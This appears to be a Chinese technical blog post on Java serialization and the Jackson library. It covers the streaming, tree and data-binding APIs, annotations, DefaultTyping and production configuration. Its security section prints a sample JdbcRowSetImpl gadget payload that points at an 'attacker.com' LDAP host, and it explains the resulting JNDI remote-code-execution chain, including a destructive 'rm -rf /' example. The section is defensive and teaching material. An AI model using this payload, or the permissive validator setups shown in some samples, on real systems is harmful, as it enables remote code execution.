+++
date = '2026-04-12T17:28:12+08:00'
draft = false
title = 'Serialization and Deserialization'
+++

# Java 序列化与反序列化：原理、Jackson 实战与避坑指南

## 一、序列化与反序列化基础

### 1.1 定义

- **序列化（Serialization）**：将内存中的对象转换为可存储或可传输的数据格式（字节流、JSON、XML 等）的过程。
- **反序列化（Deserialization）**：将存储或传输的数据格式还原为内存对象的逆过程。

```
        序列化
Object ──────► byte[] / JSON / XML / Protobuf ...
        反序列化
Object ◄────── byte[] / JSON / XML / Protobuf ...
```

### 1.2 核心目的

| 场景 | 说明 |
|------|------|
| **持久化** | 将对象状态保存到磁盘、数据库 |
| **网络传输** | RPC、HTTP API、消息队列中传递对象 |
| **进程间通信** | 跨 JVM 数据交换 |
| **深拷贝** | 通过序列化/反序列化实现对象深复制 |
| **缓存** | Redis、Memcached 等存储 Java 对象 |

### 1.3 常见序列化方案对比

| 方案 | 格式 | 可读性 | 性能 | 跨语言 | 典型场景 |
|------|------|--------|------|--------|----------|
| JDK Serializable | 二进制 | ✗ | 低 | ✗ | 遗留系统 |
| JSON (Jackson/Gson) | 文本 | ✓ | 中 | ✓ | REST API、配置 |
| Protobuf | 二进制 | ✗ | 高 | ✓ | gRPC、高性能 RPC |
| Kryo | 二进制 | ✗ | 高 | ✗ | Spark、Flink 内部 |
| Hessian | 二进制 | ✗ | 中 | ✓ | Dubbo |
| Avro | 二进制 | ✗ | 高 | ✓ | Kafka、大数据 |

### 1.4 序列化的本质问题

序列化不仅仅是"转格式"，需要解决以下核心问题：

1. **类型信息保留**：反序列化时如何还原出正确的类型？
2. **引用与循环**：对象图中存在循环引用怎么办？
3. **版本兼容**：类结构变更后旧数据能否正确反序列化？
4. **多态还原**：接口/父类引用指向的实际子类如何恢复？
5. **安全性**：反序列化是否会执行恶意代码？

---

## 二、Jackson 概述

Jackson 是 Java 生态中使用最广泛的 JSON 处理库，被 Spring Boot 作为默认 JSON 序列化方案。其核心由三个模块组成：

| 模块 | 说明 |
|------|------|
| `jackson-core` | 底层流式 API（JsonParser / JsonGenerator） |
| `jackson-annotations` | 注解定义（@JsonProperty, @JsonIgnore 等） |
| `jackson-databind` | 高层数据绑定（ObjectMapper） |

Jackson 提供三个层次的 API，抽象程度依次递增：

```
┌─────────────────────────────────────────────┐
│  ObjectMapper (Data Binding)                │  ← 最常用
│  直接 Java Object ↔ JSON                    │
├─────────────────────────────────────────────┤
│  TreeModel (JsonNode)                       │  ← 灵活操作
│  类似 DOM，按节点读写                         │
├─────────────────────────────────────────────┤
│  Streaming API (JsonParser/JsonGenerator)   │  ← 最高性能
│  逐 Token 读写，内存占用最低                  │
└─────────────────────────────────────────────┘
```

---

## 三、Jackson 三层 API 详解

### 3.1 Streaming API（流式 API）

逐 Token 解析/生成 JSON，性能最高，但使用繁琐，适合超大文件或极致性能场景。

**序列化：**

```java
JsonFactory factory = new JsonFactory();
StringWriter writer = new StringWriter();

try (JsonGenerator gen = factory.createGenerator(writer)) {
    gen.writeStartObject();                // {
    gen.writeStringField("name", "Alice"); //   "name": "Alice"
    gen.writeNumberField("age", 30);       //   "age": 30
    gen.writeFieldName("skills");          //   "skills":
    gen.writeStartArray();                 //   [
    gen.writeString("Java");              //     "Java"
    gen.writeString("Kotlin");            //     "Kotlin"
    gen.writeEndArray();                   //   ]
    gen.writeEndObject();                  // }
}
// 输出: {"name":"Alice","age":30,"skills":["Java","Kotlin"]}
```

**反序列化：**

```java
String json = "{\"name\":\"Alice\",\"age\":30}";
try (JsonParser parser = factory.createParser(json)) {
    while (parser.nextToken() != null) {
        if (parser.currentToken() == JsonToken.FIELD_NAME) {
            String field = parser.currentName();
            parser.nextToken(); // 移到值
            switch (field) {
                case "name" -> System.out.println("Name: " + parser.getText());
                case "age"  -> System.out.println("Age: " + parser.getIntValue());
            }
        }
    }
}
```

### 3.2 Tree Model（树模型）

将 JSON 解析为 `JsonNode` 树结构，适合结构不确定或只需部分字段的场景。

```java
ObjectMapper mapper = new ObjectMapper();

// 解析为树
JsonNode root = mapper.readTree("{\"name\":\"Alice\",\"address\":{\"city\":\"Beijing\"}}");

// 读取字段
String name = root.get("name").asText();           // "Alice"
String city = root.path("address").path("city").asText(); // "Beijing"

// 构建树
ObjectNode node = mapper.createObjectNode();
node.put("id", 1);
node.putArray("tags").add("java").add("jackson");
String json = mapper.writeValueAsString(node);
// {"id":1,"tags":["java","jackson"]}
```

> `get()` 在字段不存在时返回 `null`；`path()` 返回 `MissingNode`（不会 NPE），推荐使用 `path()`。

### 3.3 Data Binding（数据绑定）

最常用的方式，直接在 Java 对象与 JSON 之间互转。

```java
ObjectMapper mapper = new ObjectMapper();

// 序列化
User user = new User("Alice", 30);
String json = mapper.writeValueAsString(user);

// 反序列化
User parsed = mapper.readValue(json, User.class);

// 复杂泛型使用 TypeReference
String jsonArray = "[{\"name\":\"Alice\",\"age\":30}]";
List<User> users = mapper.readValue(jsonArray, new TypeReference<List<User>>() {});
```

---

## 四、Jackson 核心注解

### 4.1 字段控制

| 注解 | 作用 | 示例 |
|------|------|------|
| `@JsonProperty("name")` | 指定 JSON 字段名 | `@JsonProperty("user_name")` |
| `@JsonIgnore` | 忽略该字段 | 密码字段不序列化 |
| `@JsonIgnoreProperties` | 类级别忽略多个字段 | `@JsonIgnoreProperties({"temp", "internal"})` |
| `@JsonInclude` | 控制空值/默认值是否序列化 | `@JsonInclude(Include.NON_NULL)` |
| `@JsonFormat` | 格式化日期等 | `@JsonFormat(pattern = "yyyy-MM-dd")` |

### 4.2 构造与创建

```java
public class User {
    private String name;
    private int age;

    // 指定反序列化使用的构造器
    @JsonCreator
    public User(@JsonProperty("name") String name,
                @JsonProperty("age") int age) {
        this.name = name;
        this.age = age;
    }
}
```

> *(注：如果在 JDK 8+ 编译时开启了 `-parameters` 参数并注册了 `ParameterNamesModule`，则可以省略构造器参数上的 `@JsonProperty` 标注。)*

> **注意**：Jackson 默认使用无参构造器 + setter 进行反序列化。若类没有无参构造器（如 Lombok 的 `@AllArgsConstructor`），必须使用 `@JsonCreator` 或添加 `@NoArgsConstructor`。
>
> **Jackson 2.18+ 变更**：2.18 版本收紧了构造器自动检测策略。旧版本在多构造器场景下会"尝试猜测"使用哪个构造器，某些未标注 `@JsonCreator` 的类碰巧也能反序列化成功。2.18 起不再依赖这种启发式猜测，若存在多个构造器且无显式标注，将直接抛出 `MismatchedInputException: Cannot deserialize from Object value (no delegate- or property-based Creator)`。**建议**：始终显式标注 `@JsonCreator`，或提供无参构造器，不要依赖自动检测的隐式行为。

### 4.3 多态类型处理

```java
@JsonTypeInfo(
    use = JsonTypeInfo.Id.NAME,         // 使用逻辑名称
    include = JsonTypeInfo.As.PROPERTY, // 作为 JSON 属性写入
    property = "type"                   // 属性名为 "type"
)
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public abstract class Animal {
    public String name;
}

public class Dog extends Animal {
    public String breed;
}

public class Cat extends Animal {
    public boolean indoor;
}
```

序列化结果：

```json
{"type": "dog", "name": "Buddy", "breed": "Labrador"}
```

### 4.4 自定义序列化/反序列化

```java
public class MoneySerializer extends JsonSerializer<BigDecimal> {
    @Override
    public void serialize(BigDecimal value, JsonGenerator gen,
                          SerializerProvider provider) throws IOException {
        gen.writeString(value.setScale(2, RoundingMode.HALF_UP).toString());
    }
}

// 使用
public class Order {
    @JsonSerialize(using = MoneySerializer.class)
    @JsonDeserialize(using = MoneyDeserializer.class)
    private BigDecimal amount;
}
```

---

## 五、ObjectMapper 高级配置

### 5.1 常用配置项

```java
ObjectMapper mapper = new ObjectMapper();

// 反序列化时忽略 JSON 中存在但 Java 对象中不存在的字段
mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);

// 空对象不报错
mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);

// 日期不序列化为时间戳
mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);

// 允许单引号
mapper.configure(JsonParser.Feature.ALLOW_SINGLE_QUOTES, true);

// 允许无引号的字段名
mapper.configure(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES, true);

// 注册 Java 8 时间模块
mapper.registerModule(new JavaTimeModule());
```

### 5.2 全局序列化策略

```java
// 全局忽略 null 值
mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);

// 驼峰转下划线
mapper.setPropertyNamingStrategy(PropertyNamingStrategies.SNAKE_CASE);

// 注册自定义模块
SimpleModule module = new SimpleModule();
module.addSerializer(LocalDate.class, new LocalDateSerializer());
module.addDeserializer(LocalDate.class, new LocalDateDeserializer());
mapper.registerModule(module);
```

### 5.3 ObjectMapper 线程安全与最佳实践

`ObjectMapper` 是线程安全的（前提是配置完成后不再修改），应在应用中作为**单例**复用：

```java
// ✓ 正确：全局单例
public class JsonUtil {
    private static final ObjectMapper MAPPER = new ObjectMapper();

    public static String toJson(Object obj) throws JsonProcessingException {
        return MAPPER.writeValueAsString(obj);
    }
}

// ✗ 错误：每次创建新实例，浪费资源
public String convert(Object obj) throws JsonProcessingException {
    return new ObjectMapper().writeValueAsString(obj);
}
```

---

## 六、Default Typing：多态序列化的双刃剑

### 6.1 问题场景

当容器声明为 `Object`、`Map<String, Object>` 等宽泛类型时，JSON 中不包含类型信息，反序列化时 Jackson 无法知道原始类型：

```java
Map<String, Object> data = Map.of("user", new User("Alice", 30));
String json = mapper.writeValueAsString(data);
// {"user": {"name": "Alice", "age": 30}}
// 反序列化时 Jackson 不知道 "user" 对应 User 类，会降级为 LinkedHashMap
```

### 6.2 activateDefaultTyping

`activateDefaultTyping` 在序列化时自动为指定范围的类型写入类名信息（如 `@class`），反序列化时据此还原真实类型：

```java
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,      // 类型验证器
    ObjectMapper.DefaultTyping.NON_FINAL,        // 对非 final 类型启用
    JsonTypeInfo.As.PROPERTY                     // 类型信息作为 JSON 属性
);
```

启用后，序列化输出会附带 `@class` 属性：

```json
{
  "@class": "com.example.User",
  "name": "Alice",
  "age": 30
}
```

> **实战注**：在 Spring Boot 整合 Redis 缓存时常用的 `GenericJackson2JsonRedisSerializer`，其底层机制就是在序列化时强制将对象的类型信息写入 JSON（类似于开启了 `DefaultTyping`）。这也是为什么我们在 Redis 中常会看到大量包含 `@class` （或者 `@type`）属性的 JSON。这一反序列化机制在历史上也是引发 Spring、Fastjson 等框架 RCE 漏洞的重灾区。

### 6.3 DefaultTyping 的四种级别

| 级别 | 说明 |
|------|------|
| `JAVA_LANG_OBJECT` | 仅对声明为 `Object` 的字段启用 |
| `OBJECT_AND_NON_CONCRETE` | `Object` + 抽象类/接口 |
| `NON_CONCRETE_AND_ARRAYS` | 抽象类/接口 + 数组 |
| `NON_FINAL` | 对所有非 `final` 类型启用（最激进） |

### 6.4 JsonTypeInfo.As 类型写入方式

| 方式 | JSON 结构 | 说明 |
|------|-----------|------|
| `PROPERTY` | `{"@class":"...", "name":"..."}` | 作为普通属性 |
| `WRAPPER_ARRAY` | `["com.example.User", {"name":"..."}]` | 包装为数组 |
| `WRAPPER_OBJECT` | `{"com.example.User": {"name":"..."}}` | 包装为对象 |
| `EXISTING_PROPERTY` | 使用已有属性 | 适合已有 type 字段 |

---

## 七、Jackson 常见问题与注意事项

### 7.1 类型信息缺失导致降级为 LinkedHashMap

**原因**：当 Jackson 反序列化时缺少静态的目标类型信息（如泛型被擦除，或声明为 `Object`），并且 JSON 数据中也**没有提供动态类型标识**（如没有 `@class`）时，它无法将 JSON 对象映射为具体的 Java 类。此时为了保证解析不中断，Jackson 只能采用默认的反序列化策略——将 JSON 对象 `{}` 宽泛地映射为 `LinkedHashMap`，将 JSON 数组 `[]` 映射为 `ArrayList`。

常见触发场景（未配置 DefaultTyping 时）：

| 场景 | 说明 |
|------|------|
| 使用原始类型 `Map.class` | 泛型擦除，Jackson 不知道 value 是什么类型 |
| 泛型嵌套太深或声明为 `Object` | 如 `Map<String, Object>`，其包含的 POJO 反序列化必定降级 |
| 缺少具体类信息 | 顶级对象直接反序列化为 `Object.class` |

```java
ObjectMapper mapper = new ObjectMapper();
User user = new User("Alice", 30);
String json = mapper.writeValueAsString(user);
// {"name":"Alice","age":30}

// 反序列化到 Map → User 整个变成 LinkedHashMap
Map<String, Object> result = mapper.readValue(json, Map.class);
// result 不是 User，而是 LinkedHashMap{name=Alice, age=30}

// 嵌套结构同样降级
record OrderItem(String name) {}
record Order(String id, List<OrderItem> items) {}

Order order = new Order("1", List.of(new OrderItem("Apple")));
String json2 = mapper.writeValueAsString(order);
Map<String, Object> map = mapper.readValue(json2, Map.class);

Object item = ((List<?>) map.get("items")).get(0);
System.out.println(item.getClass()); // java.util.LinkedHashMap ← 不是 OrderItem
OrderItem i = (OrderItem) item; // 💥 ClassCastException
```

**解决方案**：反序列化时指定具体类型，或使用 `TypeReference` 保留泛型信息：

```java
// ✓ 直接指定目标类
User user = mapper.readValue(json, User.class);

// ✓ 泛型容器使用 TypeReference
Order result = mapper.readValue(json2, new TypeReference<Order>() {});
Map<String, List<OrderItem>> mapList = mapper.readValue(json2, new TypeReference<Map<String, List<OrderItem>>>() {});
```

### 7.2 NON_FINAL 下 @class 的写入规则

`DefaultTyping.NON_FINAL` 是否写入 `@class` 取决于**序列化上下文**，需要区分两种情况：

**规则一：顶层序列化**——根据**运行时类型**判断。

```java
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,
    ObjectMapper.DefaultTyping.NON_FINAL,
    JsonTypeInfo.As.PROPERTY
);

record B(String name) {}  // 隐式 final

Object o = new B("b1");
mapper.writeValueAsString(o);
// B 是 final → 不写入 @class
// {"name":"b1"}
```

顶层调用 `writeValueAsString(Object)` 时，由于没有“包含它的外层结构”（它不是任何类的字段），Jackson 无法获取任何“声明类型”。它只能通过 `value.getClass()` 取到**运行时类型** `B.class`。因为 `B` 是 record（隐式 `final`），被 `NON_FINAL` 过滤，所以不写入 `@class`。

**规则二：类 / record 字段的值**——根据**字段的声明类型**判断。

**底层原理**：当 Jackson 构建 POJO 序列化器时，会扫描类的所有属性。如果某字段（如 `Object field`）的**字面声明类型**（`Object.class`）是非 `final` 的，Jackson 会在初始化阶段顺理成章地给这个字段挂载一个**类型序列化器（TypeSerializer）**。
在运行时，这个挂载好的 `TypeSerializer` 会无条件地提取当前实际对象的类名并输出为 `@class`，此时它**根本不在乎实际塞入的 `B` 对象是否为 final**。

*(注：Java 泛型信息保留在类的字节码字段签名中，因此 Jackson 可以通过反射完美读取到诸如 `List<Object>` 或 `List<B>` 这样的泛型声明，并据此决定是否挂载 TypeSerializer。)*

```java
record B(String name) {}  // 隐式 final

// 字段类型 List<Object>：元素声明类型为 Object（非 final）→ 写入 B 的 @class
record A1(String id, List<Object> list) {}

// 字段类型 List<B>：元素声明类型为 B（final）→ 不写入 B 的 @class
record A2(String id, List<B> list) {}

mapper.writeValueAsString(new A1("1", new ArrayList<>(List.of(new B("b1")))));
// list 内的 B 有 @class  ✓

mapper.writeValueAsString(new A2("1", new ArrayList<>(List.of(new B("b1")))));
// list 内的 B 没有 @class  ✗
```

同理，对于带泛型的字段，只要泛型的**实参**（如 Map 的 value 位置）是非 final 的，该位置的值也会写入 `@class`：

```java
// 字段类型 Map<String, Object>：value 声明类型为 Object（非 final）→ 写入 B 的 @class
record A3(Map<String, Object> map) {}

mapper.writeValueAsString(new A3(Map.of("b", new B("b1"))));
// {"map": {"b": {"@class":"...B", "name":"b1"}}}  ✓ 有 @class
```

**⚠️ 注意：顶层局部容器的泛型擦除**

如果你直接将局部变量容器传给 Jackson：

```java
Map<String, B> map = new HashMap<>();
map.put("b", new B("b1"));

mapper.writeValueAsString(map); 
// {"@class":"java.util.HashMap", "b": {"@class":"...B", "name":"b1"}}
```

你会发现不仅 `B` 有 `@class`，连最外层的 `HashMap` 也有！
这是因为 `writeValueAsString(Object value)` 方法签名只接收 `Object`。Java 在方法传参时将局部变量的泛型 `<String, B>` **彻底擦除**。Jackson 收到的仅仅是一个光秃秃的 `HashMap`。它只能使用兜底策略：**把内部元素默认当作 `Object` 处理**。因为 `Object` 是非 final 的，它无条件触发了里面 `B` 元素的类型写入。

> **破局方法**：若要消除这种顶层序列化带来的意外 `@class`，必须手动“喂”给它被擦除的静态泛型信息：
> `mapper.writerFor(new TypeReference<Map<String, B>>() {}).writeValueAsString(map);`
```

**完整规则总结**：

| 场景 | 判断依据 | record B 是否有 @class |
|------|----------|----------------------|
| `mapper.writeValueAsString(new B(...))` | 运行时类型 B（final） | ✗ |
| 字段类型 `Map<String, Object>` 内的 B | 字段 value 类型 Object（非 final） | ✓ |
| 字段类型 `List<Object>` 内的 B | 字段元素类型 Object（非 final） | ✓ |
| 字段类型 `List<B>` 内的 B | 字段元素类型 B（final） | ✗ |
| 字段类型 `Object field` | 字段声明类型 Object（非 final） | ✓ |
| 字段类型 `B field` | 字段声明类型 B（final） | ✗ |

> `List.of()` / `Map.of()` 返回的集合实现类也是 final 的。当它们作为顶层对象或 final 声明类型的字段值时，同样不会写入 `@class`。

**`List.of()` / `Map.of()` 与 `new ArrayList<>()` / `new HashMap<>()` 的区别**：

同样的规则也适用于集合对象自身。Java 9+ 的工厂方法返回的是 JDK 内部的 final 实现类，而传统构造方式返回的是非 final 类：

| 工厂方法 | 实际返回类型 | final? | NON_FINAL 写 @class? |
|----------|-------------|--------|----------------------|
| `List.of(...)` | `ImmutableCollections$ListN` / `List12` | ✓ | ✗ |
| `Map.of(...)` | `ImmutableCollections$MapN` / `Map1` | ✓ | ✗ |
| `new ArrayList<>()` | `ArrayList` | ✗ | ✓ |
| `new HashMap<>()` | `HashMap` | ✗ | ✓ |

在需要 DefaultTyping 保留集合类型信息的场景下（如状态持久化），应使用 `new ArrayList<>()` / `new HashMap<>()` 而非 `List.of()` / `Map.of()`，否则反序列化时可能因缺少 `@class` 而无法还原正确的集合类型。

**针对以上 NON_FINAL 失效场景的综合解决方案**：

1. **针对带泛型的容器（避开元素无 @class）**：确保声明的泛型实参是非 final 的（如使用 `List<Object>` 而非 `List<B>`）。
2. **针对 record 等 final 类（避开自身无 @class）**：在 `record` 上显式标注 `@JsonTypeInfo`，强制写入类型信息：

    ```java
    // 注：若 JSON 可能来自前端或外部系统（它们一般不会传 @class），强烈建议配置 defaultImpl 兜底，否则会抛 InvalidTypeIdException
    @JsonTypeInfo(
        use = JsonTypeInfo.Id.CLASS, 
        include = JsonTypeInfo.As.PROPERTY, 
        property = "@class",
        defaultImpl = B.class  // 兜底策略
    )
    record B(String name) {}
    ```

3. **针对顶层序列化（泛型彻底被擦除）**：避免依赖 `DefaultTyping`，改用具体类型 + `TypeReference` 进行序列化和反序列化。
4. **针对集合自身类型丢失**：需要持久化具体集合类型时，彻底弃用 `List.of()` / `Map.of()`，改用普通的 `new ArrayList<>()` / `new HashMap<>()`。

### 7.3 反序列化安全漏洞（RCE）

DefaultTyping 最严重的风险不是功能问题，而是**安全漏洞**。

**原因**：开启 DefaultTyping 后，Jackson 会根据 JSON 中的 `@class` 字段实例化对应的 Java 类。如果攻击者能控制输入 JSON（如来自 HTTP 请求、消息队列），就可以构造恶意 `@class` 指向 JDK 或第三方库中的危险类，触发**远程代码执行（RCE）**。

```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/exploit",
  "autoCommit": true
}
```

黑客在这里巧妙利用了 Jackson **会自动调用对象 setter 方法**的特性，上述 JSON 反序列化时的攻击链如下：

1. **无心实例化**：Jackson 读取到 `@class`，毫不知情地实例化了 JDK 内置的类 `JdbcRowSetImpl`。
2. **埋下炸弹**：通过反射调用 `setDataSourceName("ldap://attacker.com/exploit")`，将黑客的恶意 LDAP 链接存入内部变量。
3. **引爆机关**：调用 `setAutoCommit(true)`。在 JDK 源码中，该 setter 会触发数据库属性应用逻辑，被迫向刚才存入的 `ldap` 地址发起 JNDI 查找请求。
4. **核弹爆炸（RCE）**：黑客的 LDAP 服务器响应并下发一段恶意的 Java 字节码。受害者服务器接收后立刻将其作为类加载并执行本地初始化代码（如隐藏在静态代码块中的 `Runtime.getRuntime().exec("rm -rf /")`），导致服务器彻底沦陷。

历史上大量 Jackson CVE 都与此相关（CVE-2017-7525、CVE-2019-12384 等），Jackson 维护了一份[黑名单](https://github.com/FasterXML/jackson-databind/blob/2.18/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java)持续封堵危险类，但这是一场永无止境的军备竞赛。

**解决方案**：

1. **不要使用 `LaissezFaireSubTypeValidator`**（绕过所有校验），生产环境必须用白名单：

```java
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfBaseType("com.myapp.model.")  // 只允许指定包下的类
    .allowIfSubType("java.util.ArrayList")
    .build();

mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);
```

2. **优先使用 `@JsonTypeInfo` + `@JsonSubTypes`**（显式白名单），而非全局 DefaultTyping；
3. **外部输入不要开启 DefaultTyping**：对外暴露的 API 使用普通 ObjectMapper，只在内部持久化（Redis、数据库）场景使用。

### 7.4 @class 与类结构的强耦合

**原因**：`JsonTypeInfo.Id.CLASS` 将全限定类名（如 `com.example.model.User`）写入 JSON。这意味着 JSON 数据与 Java 的包结构和类名产生了**强绑定**。一旦重构（重命名类、移动包路径），所有已持久化的 JSON 数据将无法反序列化。

```
重命名 com.example.model.User → com.example.domain.User
                  ↓
已存入 Redis/DB 的 JSON 仍包含 "@class": "com.example.model.User"
                  ↓
            反序列化失败 💥
```

**解决方案**：

1. 使用 `JsonTypeInfo.Id.NAME` 代替 `Id.CLASS`，以逻辑名称解耦：

```java
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public abstract class Animal {}
// JSON: {"type": "dog", ...}  ← 不暴露内部类名，重构不受影响
```

2. 若必须使用 `Id.CLASS`，重构时通过 `@JsonTypeName` 或自定义 `TypeIdResolver` 做新旧类名映射。

### 7.5 集合类型的 Wrapper Array 格式

`activateDefaultTyping` 对集合类型（如 `ArrayList`）也会写入类型信息。对于 Object/Map 等结构体，Jackson 可以直接插入 `@class` 属性（`As.PROPERTY`）。但 JSON 数组 `[...]` 没有属性的概念，无法直接附加 `@class`，因此 Jackson 会自动降级为 `WRAPPER_ARRAY` 格式——在数组外层再包一层数组，第一个元素为类名，第二个元素为实际数据。

这是 Jackson 的**正常设计行为**，目的是在 JSON 数组上也能携带类型信息，确保反序列化时能还原出 `ArrayList` 而非其他 `List` 实现。

```java
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,
    ObjectMapper.DefaultTyping.NON_FINAL,
    JsonTypeInfo.As.PROPERTY
);

A3 a = new A3("1", new ArrayList<>(List.of(new B3("b1"))));
String json = mapper.writeValueAsString(a);
```

输出：

```json
{
  "@class": "com.example.A3",
  "id": "1",
  "list": ["java.util.ArrayList", [
    {
      "@class": "com.example.B3",
      "name": "b1"
    }
  ]]
}
```

**在 Java ↔ Java 的闭环系统中**（如 Redis 缓存、消息队列状态持久化），这种格式完全没有问题——序列化和反序列化都由 Jackson 处理，类型信息可以正确还原。

**但在跨系统场景中会带来问题**：
- **前端/其他语言消费端**无法理解 `["java.util.ArrayList", [...]]` 结构，期望的是标准的 JSON 数组 `[...]`；
- **JSON Schema 校验**会失败，因为 `list` 字段不再是数组类型；
- 嵌套层次增加，**可读性下降**，JSON 体积增大。

**解决方案**：如果不需要保留集合的具体实现类型（大多数情况下 `ArrayList` 和 `LinkedList` 对业务无差别），可自定义 `DefaultTypeResolverBuilder`，跳过集合和 Map 类型的类型写入。

---

## 八、生产级方案：自定义 TypeResolver

在 Spring AI、LangGraph4j 等框架中，通常需要结合 DefaultTyping 来持久化含多态对象的状态（如 `Message` 子类），同时又要规避集合 Wrapper Array、安全风险等问题。其核心手段是自定义 `DefaultTypeResolverBuilder`，精确控制哪些类型需要写入 `@class`：

```java
// 生产环境务必配置白名单，避免使用全局放行的 LaissezFaireSubTypeValidator
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfBaseType("com.example.myapp.") // 替换为真实的业务包路径
    .build();

ObjectMapper.DefaultTypeResolverBuilder typeResolver =
    new ObjectMapper.DefaultTypeResolverBuilder(
        ObjectMapper.DefaultTyping.NON_FINAL,
        ptv
    ) {
        @Override
        public boolean useForType(JavaType t) {
            // 1. 跳过 Map 和 Collection 类型 → 避免 Wrapper Array
            if (t.isTypeOrSubTypeOf(Map.class)
                || t.isMapLikeType()
                || t.isCollectionLikeType()
                || t.isTypeOrSubTypeOf(Collection.class)
                || t.isArrayType()) {
                return false;
            }

            // 2. 跳过非静态内部类、局部类、匿名类
            //    这些类无法被 Jackson 反序列化（需要外部类实例）
            Class<?> rawClass = t.getRawClass();
            if (rawClass != null) {
                if (rawClass.isMemberClass()
                    && !Modifier.isStatic(rawClass.getModifiers())) {
                    return false;
                }
                if (rawClass.isLocalClass() || rawClass.isAnonymousClass()) {
                    return false;
                }
            }

            return super.useForType(t);
        }
    };

// 配置类型解析器
typeResolver.init(JsonTypeInfo.Id.CLASS, null);
typeResolver.inclusion(JsonTypeInfo.As.PROPERTY);
typeResolver.typeProperty("@class");

mapper.setDefaultTyping(typeResolver);
```

**效果**：

- `List`、`Map` 等集合不再被包装为 `["java.util.ArrayList", [...]]`；
- POJO 依然携带 `@class` 信息，多态反序列化正常工作；
- 匿名类/内部类被排除，避免无法反序列化的运行时错误。

此外，通过 Jackson 原生的特性，还可以为特定类型的多态对象自定义简洁且安全的短名称：

```java
// 避开全限定类名，为特定类型注册简短的逻辑名称（会作为 @class 的值输出）
mapper.registerSubtypes(
    new NamedType(UserMessage.class, MessageType.USER.name()),
    new NamedType(SystemMessage.class, MessageType.SYSTEM.name()),
    new NamedType(AssistantMessage.class, MessageType.ASSISTANT.name())
);
```

---

## 九、最佳实践清单

### 9.1 ObjectMapper 配置

| 实践 | 说明 |
|------|------|
| **全局单例** | `ObjectMapper` 线程安全，避免重复创建 |
| **关闭未知属性异常** | `FAIL_ON_UNKNOWN_PROPERTIES = false`，提高兼容性 |
| **注册 JavaTimeModule** | 正确处理 `LocalDate`、`Instant` 等 Java 8 时间类型 |
| **关闭时间戳模式** | `WRITE_DATES_AS_TIMESTAMPS = false`，输出 ISO 格式 |
| **设置 NON_NULL** | 全局忽略 null 字段，减少 JSON 体积 |

### 9.2 类型安全

| 实践 | 说明 |
|------|------|
| **使用 TypeReference** | 反序列化泛型时必须使用，否则泛型擦除导致类型丢失 |
| **避免 Object 容器** | `Map<String, Object>` 是类型降级的温床 |
| **record 慎用 DefaultTyping** | `record` 是 `final` 的，DefaultTyping 不会写入 `@class` |
| **生产/消费配置一致** | 两端 ObjectMapper 的 DefaultTyping 配置必须匹配 |

### 9.3 安全性

| 实践 | 说明 |
|------|------|
| **使用 PolymorphicTypeValidator** | 不要在生产环境使用 `LaissezFaireSubTypeValidator`，限制可反序列化的类 |
| **避免 @class 暴露到外部** | `@class` 包含全限定类名，泄露内部实现 |
| **优先使用 @JsonTypeInfo + @JsonSubTypes** | 显式白名单优于全局 DefaultTyping |

### 9.4 DefaultTyping 决策树

```
是否需要在 Object/接口 容器中保留多态类型？
├── 否 → 不启用 DefaultTyping，使用具体类型 + TypeReference
└── 是 → 启用 DefaultTyping
        ├── 是否需要对所有类型生效？
        │   ├── 否 → 使用 @JsonTypeInfo 按类标注
        │   └── 是 → 使用 activateDefaultTyping
        │           ├── 集合类型需要 @class 吗？
        │           │   ├── 否 → 自定义 TypeResolverBuilder 跳过集合
        │           │   └── 是 → 接受 Wrapper Array 结构
        │           └── 有 record/final 类型吗？
        │               ├── 是 → 手动加 @JsonTypeInfo 或改为普通 class
        │               └── 否 → 直接使用
```

---

## 十、常见异常速查

| 异常 | 原因 | 解决方案 |
|------|------|----------|
| `InvalidDefinitionException: No serializer found` | 类无 getter 或公开字段 | 添加 getter，或配置 `FAIL_ON_EMPTY_BEANS = false` |
| `UnrecognizedPropertyException` | JSON 含未知字段 | 配置 `FAIL_ON_UNKNOWN_PROPERTIES = false` |
| `InvalidTypeIdException` | 反序列化时找不到 `@class` 指定的类型 | 检查类路径、DefaultTyping 配置 |
| `MismatchedInputException` | JSON 结构与目标类型不匹配 | 检查 JSON 格式与 Java 类结构 |
| `ClassCastException: LinkedHashMap` | 泛型擦除导致类型降级 | 使用 `TypeReference` 保留泛型 |
| `JsonMappingException: No suitable constructor` | 缺少无参构造器 | 添加无参构造器或 `@JsonCreator` |

---

## 参考资料

- [Jackson GitHub](https://github.com/FasterXML/jackson)
- [Jackson Documentation](https://github.com/FasterXML/jackson-docs)
- [Jackson Annotations Wiki](https://github.com/FasterXML/jackson-annotations/wiki)
- [Baeldung - Jackson Tutorial](https://www.baeldung.com/jackson)
